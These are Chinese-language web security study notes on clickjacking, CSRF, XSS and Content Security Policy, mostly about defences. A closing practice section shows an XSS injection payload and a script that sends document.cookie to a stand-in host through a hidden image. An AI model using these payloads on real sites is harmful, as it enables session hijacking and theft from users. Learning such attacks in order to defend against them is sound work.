# web安全

## 点击劫持

原理：攻击者使用透明的iframe覆盖在网页上，诱使用户在点击，
1. flash点击劫持：用过flash游戏，让用户完成一系列复杂的操作
2. 图片覆盖攻击Cross Site Image Overlaying（XSIO）：

## [CSFR](https://www.ibm.com/developerworks/cn/web/1102_niugang_csrf/)

### 概念

- 在受骗者已经登录对应网站生成cookie后，攻击者做一个网站让受骗者点击，这时受骗者的cookie还在，那么这个构造的网站就能够利用受骗者的cookie执行网站恶意请求
- CSRF 攻击是黑客借助受害者的 cookie 骗取服务器的信任，但是黑客并不能拿到 cookie，也看不到 cookie 的内容
### 特点
1. 发生在第三方域名
2. 不能获取到cookie只是借用（在请求参数中加上cookie并让服务器验证），但是跨域请求拿不到cookie

### 攻击方式
由于AJAX是不支持跨域发送请求的，所以我们只能够用支持跨域请求的img、script、form表单来发起请求，这些请求的限制性很强
1. 通过img\iframe\script发起get请求
    - 由于get请求只能获取信息，不会修改数据库中信息，所以一般get请求伪造的影响较小。
2. 通过js提交form表单发起post请求
    - post请求一般是通过表单发送，而表单请求不能修改请求头，也不能带上query，所以这就是token防止csrf的原因

### [防护](https://zhuanlan.zhihu.com/p/40588156)
- referer check

- 验证码

- anti csfr token（普遍做法）

- **验证 HTTP Referer 字段；在请求地址中添加 token 并验证；在 HTTP 头中自定义属性并验证**

- 同源检测防护
  1. origin（没有path和query）
     - 在IE同源定义不一致
     - 302重定向
     2 referer check（请求的来源地址）
    - 可以被修改
- csfr `Token`
    在会话中存储CSRF Token比较繁琐，而且不能在通用的拦截上统一处理所有的接口
  
- `验证码`和密码
  确认是用户自身的行为

- 双重cookie验证，生成一个随机cookie并且在请求时附带在url里面，后端就可以验证

- cookie设置samesite属性、如果SamesiteCookie被设置为Strict，浏览器在任何跨域请求中都不会携带Cookie

## [XSS：跨站脚本攻击](https://www.freebuf.com/articles/web/185654.html)

[XSS](https://juejin.im/post/5bad9140e51d450e935c6d64#heading-13)

HTMl注入插入恶意脚本，篡改网页，在用户浏览网页时，控制用户浏览器的一种攻击，一开始的演示案例是跨域的。
  1. 攻击者提交恶意代码。
  2. 浏览器执行恶意代码。


### 分类：
1. 存储型XSS：也叫持久性XSS，恶意代码提交到`服务器端`中，`服务端`拼接html返回，再在前端解析执行。常见于评论、私信、发博客。所有查看了该博客该评论的用户，都会执行这段恶意脚本
2. **反射性**XSS：也叫非持久性XSS，输入恶意代码，通过`URL`提交执行，`服务端`取出恶意代码，拼接在html时返回，浏览器请求再执行恶意代码。
3. Dom型XSS：`前端`取出`URL`中的恶意代码执行，通过修改页面的dom节点形成的XSS，称为dom based XSS。

### 攻击方式
- 在 HTML 中内嵌的文本中，恶意内容以 script 标签形成注入。
- 在内联的 JavaScript 中，拼接的数据突破了原本的限制（字符串，变量，方法名等）。
- 在标签属性中，恶意内容包含引号，从而突破属性值的限制，注入其他属性或者标签。
- 在标签的 href、src 等属性中，包含 javascript: 等可执行代码。
- 在 onload、onerror、onclick 等事件中，注入不受控制代码。
- 在 style 属性和标签中，包含类似 background-image:url("javascript:…"); 的代码（新版本浏览器已经可以防范）。
- 在 style 属性和标签中，包含类似 expression(…) 的 CSS 表达式代码（新版本浏览器已经可以防范）。
### 危害
1. document.cookie获取cookie实现cookie劫持，可以通过绑定IP防御
2. 通过动态插入img，在src赋值上构造get请求构造get请求
3. 通过动态添加post请求的form标签，构造post请求
4. 也可以直接通过ajax请求发送构造请求
### 预防
1. 设置httponly缓解xss，可以通过trace请求读取httponly cookie反
2. 输入检查，输出检查
3. 输入过滤（输入侧过滤能够在某些情况下解决特定的 XSS 问题，但会引入很大的不确定性和乱码问题。在防范 XSS 攻击时应避免此类方法。）
4. 预防存储型和反射型 XSS 攻击：改成纯前端渲染、充分转义
5. 预防 DOM 型 XSS 攻击：避免使用DOM 中的内联事件监听器，
6. 使用CSP



##  [CSP（Content Security Policy）内容安全策略检查](http://www.ruanyifeng.com/blog/2016/09/csp.html)

   - "网页安全政策"，  CSP 的实质就是白名单制度，开发者明确告诉客户端，哪些外部资源可以加载和执行，等同于提供白名单

   - 如果只允许加载自己域的图片，可以 加上这个meta标签`<meta http-equiv="Content-Security-Policy" content="img-src 'self';">`  

   - `Content-Security-Policy: script-src 'self'`

   - `Content-Security-Policy: default-src 'self'`

   - 或者后端设置这个http响应头，self表示本域，如果加载其他域的图片浏览器会报错

   - ![image](https://pic4.zhimg.com/v2-bf28b28cd47bbab12b052811d52a1223_b.jpg)

   - ```http
     Content-Security-Policy: script-src 'self'; object-src 'none';
     style-src cdn.example.org third-party.org; child-src https:
     ```

     - 脚本：只信任当前域名
     - `<object>`标签：不信任任何URL，即不加载任何资源
     - 样式表：只信任`cdn.example.org`和`third-party.org`
     - 框架（frame）：必须使用HTTPS协议加载
     - 其他资源：没有限制

     参考：[前端安全配置之Content-Security-Policy(csp)](https://www.cnblogs.com/heyuqing/p/6215761.html)

### **referer**

在以下两种情况下，Referer 不会被发送：
    来源页面采用的协议为表示本地文件的 "file" 或者 "data" URI；
    当前请求页面采用的是非安全协议，而来源页面采用的是安全协议（HTTPS）。    

### XSS实践

页面中插入链接点击会执行

```
<a href="javascript:alert(localStorage)">跳转</a>

<a href="http://xxx/search?keyword="><script>alert('XSS');</script>"></a>
=>拼接后
<input type="text" value=""><script>alert('XSS');</script>">
```

发送cookie给对应站点

```
  var img = document.createElement('img')
  img.src='http://www.xss.com?cookie=' + document.cookie
  img.style.display='none'
  document.getElementsByTagName('body')[0].appendChild(img)
```

